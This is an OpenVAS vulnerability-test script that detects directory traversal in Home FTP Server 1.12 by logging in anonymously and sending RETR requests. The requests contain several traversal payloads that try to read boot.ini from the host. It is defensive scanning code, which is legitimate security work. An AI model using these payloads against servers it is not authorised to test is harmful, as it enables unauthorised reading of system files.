###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_home_ftp_server_dir_trav_vun.nasl 13 2013-10-27 12:16:33Z jan $
#
# Home FTP Server Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to read arbitrary files
  on the affected application.
  Impact Level: Application";
tag_affected = "Home FTP Server version 1.12";
tag_insight = "The flaw is due to an error while handling certain requests which can
  be exploited to download arbitrary files from the host system.";
tag_solution = "No solution or patch is available as of the 01st March, 2010. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://downstairs.dnsalias.net/homeftpserver.html";
tag_summary = "The host is running Home FTP Server and is prone to directory traversal
  vulnerabilities.";

if(description)
{
  script_id(801599);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-03-04 14:32:35 +0100 (Fri, 04 Mar 2011)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Home FTP Server Multiple Directory Traversal Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/16259/");

  script_description(desc);
  script_summary("Check for the directory traversal attack in Home Ftp Server");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("ftp_func.inc");
include("version_func.inc");

## Get the default port of FTP
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## check port status
if(!get_port_state(ftpPort)){
  exit(0);
}

# Get the FTP banner
banner = get_ftp_banner(port:ftpPort);
if("Home Ftp Server" >!< banner){
  exit(0);
}

soc1 = open_sock_tcp(ftpPort);
if(!soc1){
  exit(0);
}

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

## Try for anomymous user and passwrd
if(!user){
  user = "anonymous";
}

if(!pass){
  pass = "SecPod";
}

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
if(login_details)
{
  ## List the possible exploits
  exploits = make_list("RETR  /..\/..\/..\/..\boot.ini",
                       "RETR ..//..//..//..//boot.ini",
                       "RETR \\\..\..\..\..\..\..\boot.ini",
                       "RETR ../../../../../../../../../../../../../boot.ini");

  result = ftp_send_cmd(socket: soc1, cmd:"PASV");

  ## Check each exploit
  foreach exp (exploits)
  {
    result = ftp_send_cmd(socket: soc1, cmd:exp);
    if("150 Opening data connection" >< result)
    {
      security_hole(ftpPort);
      exit(0);
    }
  }

  ftp_close(socket:soc1);
}
